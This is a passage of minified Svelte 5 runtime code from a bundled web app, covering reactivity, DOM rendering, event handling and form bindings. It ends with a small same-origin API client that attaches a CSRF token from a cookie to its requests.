Yn(e){return Rn(32|w,e)}function Xn(e){var t=e.teardown;if(t!==null){let e=lr,n=dr;ur(!0),pr(null);try{t.call(null)}finally{ur(e),pr(n)}}}function Zn(e,t=!1){var n=e.first;for(e.first=e.last=null;n!==null;){let e=n.ac;e!==null&&Pn(()=>{e.abort(ue)});var r=n.next;n.f&64?n.parent=null:$n(n,t),n=r}}function Qn(e){for(var t=e.first;t!==null;){var n=t.next;t.f&32||$n(t),t=n}}function $n(e,t=!0){var n=!1;(t||e.f&262144)&&e.nodes!==null&&e.nodes.end!==null&&(er(e.nodes.start,e.nodes.end),n=!0),rt(e,S),Zn(e,t&&!n),Ar(e,0);var r=e.nodes&&e.nodes.t;if(r!==null)for(let e of r)e.stop();Xn(e),e.f^=S,e.f|=b;var i=e.parent;i!==null&&i.first!==null&&tr(e),e.next=e.prev=e.teardown=e.ctx=e.deps=e.fn=e.nodes=e.ac=e.b=null}function er(e,t){for(;e!==null;){var n=e===t?null:Tn(e);e.remove(),e=n}}function tr(e){var t=e.parent,n=e.prev,r=e.next;n!==null&&(n.next=r),r!==null&&(r.prev=n),t!==null&&(t.first===e&&(t.first=r),t.last===e&&(t.last=n))}function nr(e,t,n=!0){var r=[];rr(e,r,!0);var i=()=>{n&&$n(e),t&&t()},a=r.length;if(a>0){var o=()=>--a||i();for(var s of r)s.out(o)}else i()}function rr(e,t,n){if(!(e.f&8192)){e.f^=y;var r=e.nodes&&e.nodes.t;if(r!==null)for(let e of r)(e.is_global||n)&&t.push(e);for(var i=e.first;i!==null;){var a=i.next;if(!(i.f&64)){var o=(i.f&65536)!=0||(i.f&32)!=0&&(e.f&16)!=0;rr(i,t,o?n:!1)}i=a}}}function ir(e){ar(e,!0)}function ar(e,t){if(e.f&8192){e.f^=y,e.f&1024||(rt(e,_),jt.ensure().schedule(e));for(var n=e.first;n!==null;){var r=n.next,i=(n.f&65536)!=0||(n.f&32)!=0;ar(n,i?t:!1),n=r}var a=e.nodes&&e.nodes.t;if(a!==null)for(let e of a)(e.is_global||t)&&e.in()}}function or(e,t){if(e.nodes)for(var n=e.nodes.start,r=e.nodes.end;n!==null;){var i=n===r?null:Tn(n);t.append(n),n=i}}var sr=null,cr=!1,lr=!1;function ur(e){lr=e}var dr=null,fr=!1;function pr(e){dr=e}var B=null;function mr(e){B=e}var hr=null;function gr(e){dr!==null&&(!He||dr.f&2)&&(hr===null?hr=[e]:hr.push(e))}var _r=null,vr=0,yr=null;function br(e){yr=e}var xr=1,Sr=0,Cr=Sr;function wr(e){Cr=e}function Tr(){return++xr}function Er(e){var t=e.f;if(t&2048)return!0;if(t&2&&(e.f&=~T),t&4096){for(var n=e.deps,r=n.length,i=0;i<r;i++){var a=n[i];if(Er(a)&&nn(a),a.wv>e.wv)return!0}t&512&&Ct===null&&rt(e,g)}return!1}function Dr(e,t,r=!0){var i=e.reactions;if(i!==null&&!(!He&&hr!==null&&n.call(hr,e)))for(var a=0;a<i.length;a++){var o=i[a];o.f&2?Dr(o,t,!1):t===o&&(r?rt(o,_):o.f&1024&&rt(o,v),Rt(o))}}function Or(e){var t=_r,n=vr,r=yr,i=dr,a=hr,o=Ge,s=fr,c=Cr,l=e.f;_r=null,vr=0,yr=null,dr=l&96?null:e,hr=null,Ke(e.ctx),fr=!1,Cr=++Sr,e.ac!==null&&(Pn(()=>{e.ac.abort(ue)}),e.ac=null);try{e.f|=E;var u=e.fn,d=u();e.f|=x;var f=e.deps,p=N?.is_fork;if(_r!==null){var m;if(p||Ar(e,vr),f!==null&&vr>0)for(f.length=vr+_r.length,m=0;m<_r.length;m++)f[vr+m]=_r[m];else e.deps=f=_r;if(zn()&&e.f&512)for(m=vr;m<f.length;m++)(f[m].reactions??=[]).push(e)}else !p&&f!==null&&vr<f.length&&(Ar(e,vr),f.length=vr);if(Ye()&&yr!==null&&!fr&&f!==null&&!(e.f&6146))for(m=0;m<yr.length;m++)Dr(yr[m],e);if(i!==null&&i!==e){if(Sr++,i.deps!==null)for(let e=0;e<n;e+=1)i.deps[e].rv=Sr;if(t!==null)for(let e of t)e.rv=Sr;yr!==null&&(r===null?r=yr:r.push(...yr))}return e.f&8388608&&(e.f^=re),d}catch(e){return et(e)}finally{e.f^=E,_r=t,vr=n,yr=r,dr=i,hr=a,Ke(o),fr=s,Cr=c}}function kr(e,r){let i=r.reactions;if(i!==null){var a=t.call(i,e);if(a!==-1){var o=i.length-1;o===0?i=r.reactions=null:(i[a]=i[o],i.pop())}}if(i===null&&r.f&2&&(_r===null||!n.call(_r,r))){var s=r;s.f&512&&(s.f^=512,s.f&=~T),s.v!==Te&&it(s),rn(s),Ar(s,0)}}function Ar(e,t){var n=e.deps;if(n!==null)for(var r=t;r<n.length;r++)kr(e,n[r])}function jr(e){var t=e.f;if(!(t&16384)){rt(e,g);var n=B,r=cr;B=e,cr=!0;try{t&16777232?Qn(e):Zn(e),Xn(e);var i=Or(e);e.teardown=typeof i==`function`?i:null,e.wv=xr}finally{cr=r,B=n}}}async function Mr(){if(He)return new Promise(e=>{requestAnimationFrame(()=>e()),setTimeout(()=>e())});await Promise.resolve(),Mt()}function V(e){var t=(e.f&2)!=0;if(sr?.add(e),dr!==null&&!fr&&!(B!==null&&B.f&16384)&&(hr===null||!n.call(hr,e))){var r=dr.deps;if(dr.f&2097152)e.rv<Sr&&(e.rv=Sr,_r===null&&r!==null&&r[vr]===e?vr++:_r===null?_r=[e]:_r.push(e));else{dr.deps??=[],n.call(dr.deps,e)||dr.deps.push(e);var i=e.reactions;i===null?e.reactions=[dr]:n.call(i,dr)||i.push(dr)}}if(lr&&sn.has(e))return sn.get(e);if(t){var a=e;if(lr){var o=a.v;return(!(a.f&1024)&&a.reactions!==null||Pr(a))&&(o=tn(a)),sn.set(a,o),o}var s=(a.f&512)==0&&!fr&&dr!==null&&(cr||(dr.f&512)!=0),c=(a.f&x)===0;Er(a)&&(s&&(a.f|=512),nn(a)),s&&!c&&(an(a),Nr(a))}if(Ct?.has(e))return Ct.get(e);if(e.f&8388608)throw e.v;return e.v}function Nr(e){if(e.f|=512,e.deps!==null)for(let t of e.deps)(t.reactions??=[]).push(e),t.f&2&&!(t.f&512)&&(an(t),Nr(t))}function Pr(e){if(e.v===Te)return!0;if(e.deps===null)return!1;for(let t of e.deps)if(sn.has(t)||t.f&2&&Pr(t))return!0;return!1}function Fr(e){var t=fr;try{return fr=!0,e()}finally{fr=t}}function Ir(e){if(!(typeof e!=`object`||!e||e instanceof EventTarget)){if(D in e)Lr(e);else if(!Array.isArray(e))for(let t in e){let n=e[t];typeof n==`object`&&n&&D in n&&Lr(n)}}}function Lr(e,t=new Set){if(typeof e==`object`&&e&&!(e instanceof EventTarget)&&!t.has(e)){t.add(e),e instanceof Date&&e.getTime();for(let n in e)try{Lr(e[n],t)}catch{}let n=l(e);if(n!==Object.prototype&&n!==Array.prototype&&n!==Map.prototype&&n!==Set.prototype&&n!==Date.prototype){let t=o(n);for(let n in t){let r=t[n].get;if(r)try{r.call(e)}catch{}}}}}[...`allowfullscreen.async.autofocus.autoplay.checked.controls.default.disabled.formnovalidate.indeterminate.inert.ismap.loop.multiple.muted.nomodule.novalidate.open.playsinline.readonly.required.reversed.seamless.selected.webkitdirectory.defer.disablepictureinpicture.disableremoteplayback`.split(`.`)];var Rr=[`touchstart`,`touchmove`];function zr(e){return Rr.includes(e)}var Br=Symbol(`events`),Vr=new Set,Hr=new Set;function Ur(e,t,n,r={}){function i(e){if(r.capture||Gr.call(t,e),!e.cancelBubble)return Pn(()=>n?.call(this,e))}return e.startsWith(`pointer`)||e.startsWith(`touch`)||e===`wheel`?Qe(()=>{t.addEventListener(e,i,r)}):t.addEventListener(e,i,r),i}function H(e,t,n,r,i){var a={capture:r,passive:i},o=Ur(e,t,n,a);(t===document.body||t===window||t===document||t instanceof HTMLMediaElement)&&Bn(()=>{t.removeEventListener(e,o,a)})}var Wr=null;function Gr(e){var t=this,n=t.ownerDocument,r=e.type,a=e.composedPath?.()||[],o=a[0]||e.target;Wr=e;var s=0,c=Wr===e&&e[Br];if(c){var l=a.indexOf(c);if(l!==-1&&(t===document||t===window)){e[Br]=t;return}var u=a.indexOf(t);if(u===-1)return;l<=u&&(s=l)}if(o=a[s]||e.target,o!==t){i(e,`currentTarget`,{configurable:!0,get(){return o||n}});var d=dr,f=B;pr(null),mr(null);try{for(var p,m=[];o!==null;){var h=o.assignedSlot||o.parentNode||o.host||null;try{var g=o[Br]?.[r];g!=null&&(!o.disabled||e.target===o)&&g.call(o,e)}catch(e){p?m.push(e):p=e}if(e.cancelBubble||h===t||h===null)break;o=h}if(p){for(let e of m)queueMicrotask(()=>{throw e});throw p}}finally{e[Br]=t,delete e.currentTarget,pr(d),mr(f)}}}var Kr=globalThis?.window?.trustedTypes&&globalThis.window.trustedTypes.createPolicy(`svelte-trusted-html`,{createHTML:e=>e});function qr(e){return Kr?.createHTML(e)??e}function Jr(e){var t=On(`template`);return t.innerHTML=qr(e.replaceAll(`<!>`,`<!---->`)),t.content}function Yr(e,t){var n=B;n.nodes===null&&(n.nodes={start:e,end:t,a:null,t:null})}function U(e,t){var n=(t&1)!=0,r=(t&2)!=0,i,a=!e.startsWith(`<!>`);return()=>{if(k)return Yr(A,null),A;i===void 0&&(i=Jr(a?e:`<!>`+e),n||(i=wn(i)));var t=r||yn?document.importNode(i,!0):i.cloneNode(!0);if(n){var o=wn(t),s=t.lastChild;Yr(o,s)}else Yr(t,t);return t}}function Xr(e,t,n=`svg`){var r=!e.startsWith(`<!>`),i=(t&1)!=0,a=`<${n}>${r?e:`<!>`+e}</${n}>`,o;return()=>{if(k)return Yr(A,null),A;if(!o){var e=wn(Jr(a));if(i)for(o=document.createDocumentFragment();wn(e);)o.appendChild(wn(e));else o=wn(e)}var t=o.cloneNode(!0);if(i){var n=wn(t),r=t.lastChild;Yr(n,r)}else Yr(t,t);return t}}function Zr(e,t){return Xr(e,t,`svg`)}function Qr(e=``){if(!k){var t=Cn(e+``);return Yr(t,t),t}var n=A;return n.nodeType===3?kn(n):(n.before(n=Cn()),Pe(n)),Yr(n,n),n}function $r(){if(k)return Yr(A,null),A;var e=document.createDocumentFragment(),t=document.createComment(``),n=Cn();return e.append(t,n),Yr(t,n),e}function W(e,t){if(k){var n=B;(!(n.f&32768)||n.nodes.end===null)&&(n.nodes.end=A),Fe();return}e!==null&&e.before(t)}function G(e,t){var n=t==null?``:typeof t==`object`?`${t}`:t;n!==(e[ce]??=e.nodeValue)&&(e[ce]=n,e.nodeValue=`${n}`)}function ei(e,t){return ni(e,t)}var ti=new Map;function ni(e,{target:t,anchor:n,props:i={},events:a,context:o,intro:s=!0,transformError:c}){Sn();var l=void 0,u=Wn(()=>{var s=n??t.appendChild(Cn());Ut(s,{pending:()=>{}},t=>{qe({});var n=Ge;if(o&&(n.c=o),a&&(i.$$events=a),k&&Yr(t,null),l=e(t,i)||{},k&&(B.nodes.end=A,A===null||A.nodeType!==8||A.data!==`]`))throw Ae(),we;Je()},c);var u=new Set,d=e=>{for(var n=0;n<e.length;n++){var r=e[n];if(!u.has(r)){u.add(r);var i=zr(r);for(let e of[t,document]){var a=ti.get(e);a===void 0&&(a=new Map,ti.set(e,a));var o=a.get(r);o===void 0?(e.addEventListener(r,Gr,{passive:i}),a.set(r,1)):a.set(r,o+1)}}}};return d(r(Vr)),Hr.add(d),()=>{for(var e of u)for(let n of[t,document]){var r=ti.get(n),i=r.get(e);--i==0?(n.removeEventListener(e,Gr),r.delete(e),r.size===0&&ti.delete(n)):r.set(e,i)}Hr.delete(d),s!==n&&s.parentNode?.removeChild(s)}});return ri.set(l,u),l}var ri=new WeakMap,ii=class{anchor;#e=new Map;#t=new Map;#n=new Map;#r=new Set;#i=!0;constructor(e,t=!0){this.anchor=e,this.#i=t}#a=e=>{if(this.#e.has(e)){var t=this.#e.get(e),n=this.#t.get(t);if(n)ir(n),this.#r.delete(t);else{var r=this.#n.get(t);r&&(this.#t.set(t,r.effect),this.#n.delete(t),r.fragment.lastChild.remove(),this.anchor.before(r.fragment),n=r.effect)}for(let[t,n]of this.#e){if(this.#e.delete(t),t===e)break;let r=this.#n.get(n);r&&($n(r.effect),this.#n.delete(n))}for(let[e,r]of this.#t){if(e===t||this.#r.has(e))continue;let i=()=>{if(Array.from(this.#e.values()).includes(e)){var t=document.createDocumentFragment();or(r,t),t.append(Cn()),this.#n.set(e,{effect:r,fragment:t})}else $n(r);this.#r.delete(e),this.#t.delete(e)};this.#i||!n?(this.#r.add(e),nr(r,i,!1)):i()}}};#o=e=>{this.#e.delete(e);let t=Array.from(this.#e.values());for(let[e,n]of this.#n)t.includes(e)||($n(n.effect),this.#n.delete(e))};ensure(e,t){var n=N,r=Dn();if(t&&!this.#t.has(e)&&!this.#n.has(e))if(r){var i=document.createDocumentFragment(),a=Cn();i.append(a),this.#n.set(e,{effect:Yn(()=>t(a)),fragment:i})}else this.#t.set(e,Yn(()=>t(this.anchor)));if(this.#e.set(n,e),r){for(let[t,r]of this.#t)t===e?n.unskip_effect(r):n.skip_effect(r);for(let[t,r]of this.#n)t===e?n.unskip_effect(r.effect):n.skip_effect(r.effect);n.oncommit(this.#a),n.ondiscard(this.#o)}else k&&(this.anchor=A),this.#a(n)}};function K(e,t,n=!1){var r;k&&(r=A,Fe());var i=new ii(e),a=n?C:0;function o(e,t){if(k){var n=Re(r);if(e!==parseInt(n.substring(1))){var a=Le();Pe(a),i.anchor=a,Ne(!1),i.ensure(e,t),Ne(!0);return}}i.ensure(e,t)}Jn(()=>{var e=!1;t((t,n=0)=>{e=!0,o(n,t)}),e||o(-1,null)},a)}function ai(e,t){return t}function oi(e,t,n){for(var i=[],a=t.length,o,s=t.length,c=0;c<a;c++){let n=t[c];nr(n,()=>{if(o){if(o.pending.delete(n),o.done.add(n),o.pending.size===0){var t=e.outrogroups;si(e,r(o.done)),t.delete(o),t.size===0&&(e.outrogroups=null)}}else --s},!1)}if(s===0){var l=i.length===0&&n!==null;if(l){var u=n,d=u.parentNode;En(d),d.append(u),e.items.clear()}si(e,t,!l)}else o={pending:new Set(t),done:new Set},(e.outrogroups??=new Set).add(o)}function si(e,t,n=!0){var r;if(e.pending.size>0){r=new Set;for(let t of e.pending.values())for(let n of t)r.add(e.items.get(n).e)}for(var i=0;i<t.length;i++){var a=t[i];r?.has(a)?(a.f|=te,or(a,document.createDocumentFragment())):$n(t[i],n)}}var ci;function li(t,n,i,a,o,s=null){var c=t,l=new Map;if(n&4){var u=t;c=k?Pe(wn(u)):u.appendChild(Cn())}k&&Fe();var d=null,f=$t(()=>{var t=i();return e(t)?t:t==null?[]:r(t)}),p,m=new Map,h=!0;function g(e){v.effect.f&16384||(v.pending.delete(e),v.fallback=d,di(v,p,c,n,a),d!==null&&(p.length===0?d.f&33554432?(d.f^=te,pi(d,null,c)):ir(d):nr(d,()=>{d=null})))}function _(e){v.pending.delete(e)}var v={effect:Jn(()=>{p=V(f);var e=p.length;let t=!1;k&&Re(c)===`[!`!=(e===0)&&(c=Le(),Pe(c),Ne(!1),t=!0);for(var r=new Set,u=N,v=Dn(),y=0;y<e;y+=1){k&&A.nodeType===8&&A.data===`]`&&(c=A,t=!0,Ne(!1));var b=p[y],x=a(b,y),S=h?null:l.get(x);S?(S.v&&dn(S.v,b),S.i&&dn(S.i,y),v&&u.unskip_effect(S.e)):(S=fi(l,h?c:ci??=Cn(),b,x,y,o,n,i),h||(S.e.f|=te),l.set(x,S)),r.add(x)}if(e===0&&s&&!d&&(h?d=Yn(()=>s(c)):(d=Yn(()=>s(ci??=Cn())),d.f|=te)),e>r.size&&me(``,``,``),k&&e>0&&Pe(Le()),!h)if(m.set(u,r),v){for(let[e,t]of l)r.has(e)||u.skip_effect(t.e);u.oncommit(g),u.ondiscard(_)}else g(u);t&&Ne(!0),V(f)}),flags:n,items:l,pending:m,outrogroups:null,fallback:d};h=!1,k&&(c=A)}function ui(e){for(;e!==null&&!(e.f&32);)e=e.next;return e}function di(e,t,n,i,a){var o=(i&8)!=0,s=t.length,c=e.items,l=ui(e.effect.first),u,d=null,f,p=[],m=[],h,g,_,v;if(o)for(v=0;v<s;v+=1)h=t[v],g=a(h,v),_=c.get(g).e,_.f&33554432||(_.nodes?.a?.measure(),(f??=new Set).add(_));for(v=0;v<s;v+=1){if(h=t[v],g=a(h,v),_=c.get(g).e,e.outrogroups!==null)for(let t of e.outrogroups)t.pending.delete(_),t.done.delete(_);if(_.f&8192&&(ir(_),o&&(_.nodes?.a?.unfix(),(f??=new Set).delete(_))),_.f&33554432)if(_.f^=te,_===l)pi(_,null,n);else{var y=d?d.next:l;_===e.effect.last&&(e.effect.last=_.prev),_.prev&&(_.prev.next=_.next),_.next&&(_.next.prev=_.prev),mi(e,d,_),mi(e,_,y),pi(_,y,n),d=_,p=[],m=[],l=ui(d.next);continue}if(_!==l){if(u!==void 0&&u.has(_)){if(p.length<m.length){var b=m[0],x;d=b.prev;var S=p[0],C=p[p.length-1];for(x=0;x<p.length;x+=1)pi(p[x],b,n);for(x=0;x<m.length;x+=1)u.delete(m[x]);mi(e,S.prev,C.next),mi(e,d,S),mi(e,C,b),l=b,d=C,--v,p=[],m=[]}else u.delete(_),pi(_,l,n),mi(e,_.prev,_.next),mi(e,_,d===null?e.effect.first:d.next),mi(e,d,_),d=_;continue}for(p=[],m=[];l!==null&&l!==_;)(u??=new Set).add(l),m.push(l),l=ui(l.next);if(l===null)continue}_.f&33554432||p.push(_),d=_,l=ui(_.next)}if(e.outrogroups!==null){for(let t of e.outrogroups)t.pending.size===0&&(si(e,r(t.done)),e.outrogroups?.delete(t));e.outrogroups.size===0&&(e.outrogroups=null)}if(l!==null||u!==void 0){var w=[];if(u!==void 0)for(_ of u)_.f&8192||w.push(_);for(;l!==null;)!(l.f&8192)&&l!==e.fallback&&w.push(l),l=ui(l.next);var ee=w.length;if(ee>0){var T=i&4&&s===0?n:null;if(o){for(v=0;v<ee;v+=1)w[v].nodes?.a?.measure();for(v=0;v<ee;v+=1)w[v].nodes?.a?.fix()}oi(e,w,T)}}o&&Qe(()=>{if(f!==void 0)for(_ of f)_.nodes?.a?.apply()})}function fi(e,t,n,r,i,a,o,s){var c=o&1?o&16?ln(n):un(n,!1,!1):null,l=o&2?ln(i):null;return{v:c,i:l,e:Yn(()=>(a(t,c??n,l??i,s),()=>{e.delete(r)}))}}function pi(e,t,n){if(e.nodes)for(var r=e.nodes.start,i=e.nodes.end,a=t&&!(t.f&33554432)?t.nodes.start:n;r!==null;){var o=Tn(r);if(a.before(r),r===i)return;r=o}}function mi(e,t,n){t===null?e.effect.first=n:t.next=n,n===null?e.effect.last=t:n.prev=t}function hi(e,t,n=!1,r=!1,i=!1,a=!1){var o=e,s=``;if(n){var c=e;k&&(o=Pe(wn(c)))}z(()=>{var e=B;if(s===(s=t()??``)){k&&Fe();return}if(n&&!k){e.nodes=null,c.innerHTML=s,s!==``&&Yr(wn(c),c.lastChild);return}if(e.nodes!==null&&(er(e.nodes.start,e.nodes.end),e.nodes=null),s!==``){if(k){for(var a=A.data,l=Fe(),u=l;l!==null&&(l.nodeType!==8||l.data!==``);)u=l,l=Tn(l);if(l===null)throw Ae(),we;Yr(A,u),o=Pe(l);return}var d=On(r?`svg`:i?`math`:`template`,r?De:i?Oe:void 0);d.innerHTML=s;var f=r||i?d:d.content;if(Yr(wn(f),f.lastChild),r||i)for(;wn(f);)o.before(wn(f));else o.before(f)}})}var gi=[...` 	
+\r\f\xA0\v﻿`];function _i(e,t,n){var r=e==null?``:``+e;if(t&&(r=r?r+` `+t:t),n){for(var i of Object.keys(n))if(n[i])r=r?r+` `+i:i;else if(r.length)for(var a=i.length,o=0;(o=r.indexOf(i,o))>=0;){var s=o+a;(o===0||gi.includes(r[o-1]))&&(s===r.length||gi.includes(r[s]))?r=(o===0?``:r.substring(0,o))+r.substring(s+1):o=s}}return r===``?null:r}function vi(e,t=!1){var n=t?` !important;`:`;`,r=``;for(var i of Object.keys(e)){var a=e[i];a!=null&&a!==``&&(r+=` `+i+`: `+a+n)}return r}function yi(e){return e[0]!==`-`||e[1]!==`-`?e.toLowerCase():e}function bi(e,t){if(t){var n=``,r,i;if(Array.isArray(t)?(r=t[0],i=t[1]):r=t,e){e=String(e).replaceAll(/\s*\/\*.*?\*\/\s*/g,``).trim();var a=!1,o=0,s=!1,c=[];r&&c.push(...Object.keys(r).map(yi)),i&&c.push(...Object.keys(i).map(yi));var l=0,u=-1;let t=e.length;for(var d=0;d<t;d++){var f=e[d];if(s?f===`/`&&e[d-1]===`*`&&(s=!1):a?a===f&&(a=!1):f===`/`&&e[d+1]===`*`?s=!0:f===`"`||f===`'`?a=f:f===`(`?o++:f===`)`&&o--,!s&&a===!1&&o===0){if(f===`:`&&u===-1)u=d;else if(f===`;`||d===t-1){if(u!==-1){var p=yi(e.substring(l,u).trim());if(!c.includes(p)){f!==`;`&&d++;var m=e.substring(l,d).trim();n+=` `+m+`;`}}l=d+1,u=-1}}}}return r&&(n+=vi(r)),i&&(n+=vi(i,!0)),n=n.trim(),n===``?null:n}return e==null?null:String(e)}function q(e,t,n,r,i,a){var o=e[oe];if(k||o!==n||o===void 0){var s=_i(n,r,a);(!k||s!==e.getAttribute(`class`))&&(s==null?e.removeAttribute(`class`):t?e.className=s:e.setAttribute(`class`,s)),e[oe]=n}else if(a&&i!==a)for(var c in a){var l=!!a[c];(i==null||l!==!!i[c])&&e.classList.toggle(c,l)}return a}function xi(e,t={},n,r){for(var i in n){var a=n[i];t[i]!==a&&(n[i]==null?e.style.removeProperty(i):e.style.setProperty(i,a,r))}}function Si(e,t,n,r){var i=e[se];if(k||i!==t){var a=bi(t,r);(!k||a!==e.getAttribute(`style`))&&(a==null?e.removeAttribute(`style`):e.style.cssText=a),e[se]=t}else r&&(Array.isArray(r)?(xi(e,n?.[0],r[0]),xi(e,n?.[1],r[1],`important`)):xi(e,n,r));return r}function Ci(t,n,r=!1){if(t.multiple){if(n==null)return;if(!e(n))return je();for(var i of t.options)i.selected=n.includes(Ei(i));return}for(i of t.options)if(_n(Ei(i),n)){i.selected=!0;return}(!r||n!==void 0)&&(t.selectedIndex=-1)}function wi(e){var t=new MutationObserver(()=>{Ci(e,e.__value)});t.observe(e,{childList:!0,subtree:!0,attributes:!0,attributeFilter:[`value`]}),Bn(()=>{t.disconnect()})}function Ti(e,t,n=t){var r=new WeakSet,i=!0;Fn(e,`change`,t=>{var i=t?`[selected]`:`:checked`,a;if(e.multiple)a=[].map.call(e.querySelectorAll(i),Ei);else{var o=e.querySelector(i)??e.querySelector(`option:not([disabled])`);a=o&&Ei(o)}n(a),e.__value=a,N!==null&&r.add(N)}),Gn(()=>{var a=t();if(e===document.activeElement){var o=He?St:N;if(r.has(o))return}if(Ci(e,a,i),i&&a===void 0){var s=e.querySelector(`:checked`);s!==null&&(a=Ei(s),n(a))}e.__value=a,i=!1}),wi(e)}function Ei(e){return`__value`in e?e.__value:e.value}var Di=Symbol(`is custom element`),Oi=Symbol(`is html`),ki=de?`link`:`LINK`,Ai=de?`progress`:`PROGRESS`;function J(e){if(k){var t=!1,n=()=>{if(!t){if(t=!0,e.hasAttribute(`value`)){var n=e.value;Y(e,`value`,null),e.value=n}if(e.hasAttribute(`checked`)){var r=e.checked;Y(e,`checked`,null),e.checked=r}}};e[le]=n,Qe(n),Nn()}}function ji(e,t){var n=Mi(e);n.value===(n.value=t??void 0)||e.value===t&&(t!==0||e.nodeName!==Ai)||(e.value=t??``)}function Y(e,t,n,r){var i=Mi(e);k&&(i[t]=e.getAttribute(t),t===`src`||t===`srcset`||t===`href`&&e.nodeName===ki)||i[t]!==(i[t]=n)&&(t===`loading`&&(e[ie]=n),n==null?e.removeAttribute(t):typeof n!=`string`&&Pi(e).includes(t)?e[t]=n:e.setAttribute(t,n))}function Mi(e){return e[ae]??={[Di]:e.nodeName.includes(`-`),[Oi]:e.namespaceURI===Ee}}var Ni=new Map;function Pi(e){var t=e.getAttribute(`is`)||e.nodeName,n=Ni.get(t);if(n)return n;Ni.set(t,n=[]);for(var r,i=e,a=Element.prototype;a!==i;){for(var s in r=o(i),r)r[s].set&&s!==`innerHTML`&&s!==`textContent`&&s!==`innerText`&&n.push(s);i=l(i)}return n}function X(e,t,n=t){var r=new WeakSet;Fn(e,`input`,async i=>{var a=i?e.defaultValue:e.value;if(a=Ii(e)?Li(a):a,n(a),N!==null&&r.add(N),await Mr(),a!==(a=t())){var o=e.selectionStart,s=e.selectionEnd,c=e.value.length;if(e.value=a??``,s!==null){var l=e.value.length;o===s&&s===c&&l>c?(e.selectionStart=l,e.selectionEnd=l):(e.selectionStart=o,e.selectionEnd=Math.min(s,l))}}}),(k&&e.defaultValue!==e.value||Fr(t)==null&&e.value)&&(n(Ii(e)?Li(e.value):e.value),N!==null&&r.add(N)),qn(()=>{var n=t();if(e===document.activeElement){var i=He?St:N;if(r.has(i))return}Ii(e)&&n===Li(e.value)||e.type===`date`&&!n&&!e.value||n!==e.value&&(e.value=n??``)})}function Fi(e,t,n=t){Fn(e,`change`,t=>{n(t?e.defaultChecked:e.checked)}),(k&&e.defaultChecked!==e.checked||Fr(t)==null)&&n(e.checked),qn(()=>{e.checked=!!t()})}function Ii(e){var t=e.type;return t===`number`||t===`range`}function Li(e){return e===``?null:+e}function Ri(e,t){return e===t||e?.[D]===t}function zi(e={},t,n,r){var i=Ge.r,a=B;return Gn(()=>{var o,s;return qn(()=>{o=s,s=r?.()||[],Fr(()=>{Ri(n(...s),e)||(t(e,...s),o&&Ri(n(...o),e)&&t(null,...o))})}),()=>{let r=a;for(;r!==i&&r.parent!==null&&r.parent.f&33554432;)r=r.parent;let o=()=>{s&&Ri(n(...s),e)&&t(null,...s)},c=r.teardown;r.teardown=()=>{o(),c?.()}}}),e}function Bi(e){return function(...t){return t[0].stopPropagation(),e?.apply(this,t)}}function Vi(e=!1){let t=Ge,n=t.l.u;if(!n)return;let r=()=>Ir(t.s);if(e){let e=0,n={},i=Yt(()=>{let r=!1,i=t.s;for(let e in i)i[e]!==n[e]&&(n[e]=i[e],r=!0);return r&&e++,e});r=()=>V(i)}n.b.length&&Un(()=>{Hi(t,r),p(n.b)}),Vn(()=>{let e=Fr(()=>n.m.map(f));return()=>{for(let t of e)typeof t==`function`&&t()}}),n.a.length&&Vn(()=>{Hi(t,r),p(n.a)})}function Hi(e,t){if(e.l.s)for(let t of e.l.s)V(t);t()}function Ui(t,n){var r=t.$$events?.[n.type];for(var i of e(r)?r.slice():r==null?[]:[r])i.call(this,n)}function Wi(e,t,n,r){var i=!Ue||(n&2)!=0,o=(n&8)!=0,s=(n&16)!=0,c=r,l=!0,u=void 0,d=()=>s&&i?(u??=Yt(r),V(u)):(l&&(l=!1,c=s?Fr(r):r),c);let f;if(o){var p=D in e||O in e;f=a(e,t)?.set??(p&&t in e?n=>e[t]=n:void 0)}var m,h=!1;o?[m,h]=yt(()=>e[t]):m=e[t],m===void 0&&r!==void 0&&(m=d(),f&&(i&&ye(t),f(m)));var g=i?()=>{var n=e[t];return n===void 0?d():(l=!0,n)}:()=>{var n=e[t];return n!==void 0&&(c=void 0),n===void 0?c:n};if(i&&!(n&4))return g;if(f){var _=e.$$legacy;return(function(e,t){return arguments.length>0?((!i||!t||_||h)&&f(t?g():e),e):g()})}var v=!1,y=(n&1?Yt:$t)(()=>(v=!1,g()));o&&V(y);var b=B;return(function(e,t){if(arguments.length>0){let n=t?V(y):i&&o?hn(e):e;return F(y,n),v=!0,c!==void 0&&(c=n),e}return lr&&v||b.f&16384?y.v:V(y)})}function Gi(e){Ge===null&&fe(`onMount`),Ue&&Ge.l!==null?qi(Ge).m.push(e):Vn(()=>{let t=Fr(e);if(typeof t==`function`)return t})}function Ki(e){Ge===null&&fe(`onDestroy`),Gi(()=>()=>Fr(e))}function qi(e){var t=e.l;return t.u??={a:[],b:[],m:[]}}typeof window<`u`&&((window.__svelte??={}).v??=new Set).add(`5`);var Z=class extends Error{status;code;constructor(e,t,n){super(n),this.status=e,this.code=t,this.name=`ApiError`}};function Ji(){if(typeof document>`u`)return null;let e=document.cookie.match(/(?:^|;\s*)ember_csrf=([^;]+)/);return e?decodeURIComponent(e[1]):null}async function Q(e,t,n,r){let i={method:e,credentials:`include`,signal:r?.signal},a={};if(n!==void 0&&(a[`Content-Type`]=`application/json`,i.body=JSON.stringify(n)),e!==`GET`&&e!==`HEAD`&&e!==`OPTIONS`){let e=Ji();e&&(a[`X-Ember-CSRF`]=e)}i.headers=a;let o=await fetch(t,i);if(o.status===401&&typeof window<`u`&&!t.endsWith(`/api/auth/login`)&&window.dispatchEvent(new CustomEvent(`ember:unauthorized`)),!o.ok){let e=`http_`+o.status,t=o.statusText;try{let n=await o.json();n?.error?.code&&(e=n.error.code),n?.error?.message&&(t=n.error.message)}catch{}throw new Z(o.status,e,t)}if(o.status===204)return{data:void 0};let s=await o.json();return{data:s.data,meta:s.meta}}var 